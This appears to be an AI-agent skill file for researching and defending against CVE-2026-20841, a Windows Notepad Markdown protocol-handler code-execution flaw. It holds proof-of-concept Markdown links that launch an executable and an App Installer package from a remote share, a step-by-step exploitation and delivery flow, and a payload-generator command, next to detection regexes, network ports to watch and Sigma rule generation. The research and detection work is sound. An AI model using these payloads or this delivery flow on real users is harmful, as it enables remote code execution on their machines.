---
name: windows-protocol-handler-abuse
description: Windows Notepad Markdown protocol handler abuse research and defense. Use this skill whenever the user mentions Windows Notepad, Markdown rendering vulnerabilities, ShellExecuteExW, protocol handler abuse, CVE-2026-20841, or needs to create PoC payloads, detection rules, or understand the attack surface of Windows applications that render Markdown/HTML with weak scheme allowlisting.
---

# Windows Protocol Handler / ShellExecute Abuse Research

This skill helps security researchers and defenders understand, test, and defend against protocol handler abuse vulnerabilities in Windows applications that render Markdown/HTML content.

## What this skill covers

- Creating PoC Markdown payloads for testing protocol handler abuse
- Generating detection rules for SIEM/EDR systems
- Understanding the ShellExecuteExW attack surface
- Analyzing protocol handler configurations
- Researching CVE-2026-20841 and similar vulnerabilities

## When to use this skill

Use this skill when:
- You need to create test payloads for Windows Notepad Markdown mode
- You want to generate detection rules for protocol handler abuse
- You're researching CVE-2026-20841 or similar vulnerabilities
- You need to understand how `ShellExecuteExW` processes Markdown links
- You're building defensive controls for Markdown rendering applications

## Core concepts

### The vulnerability

Modern Windows applications that render Markdown/HTML often:
1. Turn user-supplied links into clickable elements
2. Hand them to `ShellExecuteExW` for processing
3. Lack strict scheme allowlisting
4. Allow any registered protocol handler to execute

This leads to code execution in the current user context when a victim clicks a malicious link.

### Notepad-specific behavior

- Notepad chooses Markdown mode **only for `.md` extensions** via fixed string comparison
- Supported link syntaxes:
  - Standard: `[text](target)`
  - Autolink: `<target>` (rendered as `[target](target)`)
- Link clicks are processed with weak filtering before calling `ShellExecuteExW`
- `ShellExecuteExW` dispatches to **any configured protocol handler**, not just HTTP(S)

### Payload considerations

- `\\` sequences in links are **normalized to `\`** before `ShellExecuteExW`
- `.md` files are **not associated with Notepad by default** - victim must open in Notepad
- Dangerous schemes include:
  - `file://` - launch local/UNC payloads
  - `ms-appinstaller://` - trigger App Installer flows
  - Any locally registered protocol handler

## Creating PoC payloads

### Minimal PoC examples

```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```

### Exploitation flow

1. Craft a **`.md` file** so Notepad renders it as Markdown
2. Embed a link using a dangerous URI scheme
3. Deliver the file via HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB
4. Convince the user to open it in Notepad
5. On click, the **normalized link** is handed to `ShellExecuteExW`
6. The corresponding protocol handler executes in the user's context

## Detection strategies

### Network monitoring

Monitor transfers of `.md` files over common document delivery ports:
- `20/21` (FTP)
- `80` (HTTP)
- `443` (HTTPS)
- `110` (POP3)
- `143` (IMAP)
- `25/587` (SMTP)
- `139/445` (SMB/CIFS)
- `2049` (NFS)
- `111` (portmap)

### Content inspection

Parse Markdown links (standard and autolink) and look for **case-insensitive** dangerous schemes:
- `file:`
- `ms-appinstaller:`
- Any non-HTTP(S) scheme reaching `ShellExecuteExW`

### Detection regexes

```regex
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```

### Behavioral detection

- Patch behavior reportedly **allowlists local files and HTTP(S)**
- Anything else reaching `ShellExecuteExW` is suspicious
- Extend detections to other installed protocol handlers as needed

## Available tools

### Generate PoC payload

Use the `generate-poc.py` script to create test Markdown files:

```bash
python scripts/generate-poc.py --scheme file --target \\192.0.2.10\\share\\evil.exe --output test-payload.md
```

### Generate detection rules

Use the `generate-detection-rules.py` script to create SIEM/EDR rules:

```bash
python scripts/generate-detection-rules.py --format sigma --output detection-rules.yaml
```

## References

- [CVE-2026-20841: Arbitrary Code Execution in the Windows Notepad](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [CVE-2026-20841 PoC](https://github.com/BTtea/CVE-2026-20841-PoC)

## Important notes

- This skill is for **defensive research and authorized testing only**
- Always have proper authorization before testing on systems
- `.md` files require user interaction (opening in Notepad, clicking link)
- Attack surface varies by system based on installed protocol handlers
- Detection rules should be customized for your environment's protocol handlers
